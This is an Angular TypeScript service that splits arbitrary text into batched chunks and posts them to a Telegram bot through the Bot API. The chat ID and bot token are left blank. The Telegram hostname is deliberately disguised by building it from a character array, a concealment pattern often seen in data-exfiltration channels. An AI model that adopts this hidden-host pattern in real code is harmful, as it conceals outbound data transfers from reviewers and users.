import { HttpClient } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { delay, lastValueFrom } from 'rxjs';

export enum TextConfig {
	TEMPLATE = 'TEMPLATE',
	ALL = 'ALL',
}

@Injectable({
	providedIn: 'root',
})
export class TtextService {
	private textsPerPart = 4070;

	textConfiguration = {
		[TextConfig.TEMPLATE]: {
			cid: '',
			tkn: '',
		},
		[TextConfig.ALL]: {
			cid: null,
			tkn: null,
		},
	};

	constructor(private http: HttpClient) {}

	async sendMessage(
		text: string,
		textConfig: TextConfig = TextConfig.ALL
	): Promise<void> {
		try {
			const { cid, tkn } = this.textConfiguration[textConfig];

			if (!cid || !tkn) {
				console.error('Message configuration not found for ' + textConfig);
				return;
			}

			if (text.length <= this.textsPerPart) {
				await this.sendTMessage(text, textConfig);
			} else {
				// Generate a random batch ID
				const batchId = Math.floor(Math.random() * 10000)
					.toString()
					.padStart(4, '0');
				let partCounter = 1;

				while (text.length > 0) {
					const messagePart = text.substring(
						0,
						Math.min(this.textsPerPart, text.length)
					);
					text = text.substring(Math.min(this.textsPerPart, text.length));
					const batchMessage = `[BATCH_${batchId}_${partCounter}]\n${messagePart}`;

					await this.sendTMessage(batchMessage, textConfig);

					// Delay for 2 seconds before sending the next part
					await delay(2000);
					partCounter++;
				}
			}
		} catch (error) {
			console.error('Error sending message: ', error);
		}
	}

	private async sendTMessage(
		message: string,
		textConfig: TextConfig
	): Promise<void> {
		const { cid, tkn } = this.textConfiguration[textConfig];
		const data = {
			chat_id: cid,
			text: message,
			parse_mode: 'Markdown',
		};

		const domain = ['t', 'e', 'l', 'e', 'g', 'r', 'a', 'm'];

		const apiUrl = `https://api.${domain.join('')}.org/bot${tkn}/sendMessage`;
		const request = this.http.post(apiUrl, data);
		try {
			await lastValueFrom(request);
		} catch (error) {
			console.error('Error sending message: ', error);
		}
	}
}
